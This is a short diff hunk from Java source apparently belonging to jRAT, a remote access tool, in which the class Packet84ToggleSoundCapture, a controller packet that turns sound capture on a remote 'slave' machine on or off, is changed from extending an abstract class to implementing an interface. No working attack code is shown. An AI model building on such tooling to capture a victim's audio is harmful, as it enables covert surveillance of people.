@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet84ToggleSoundCapture extends AbstractOutgoingPacket {
+public class Packet84ToggleSoundCapture implements OutgoingPacket {
 
 	private boolean enable;
 	private int quality;
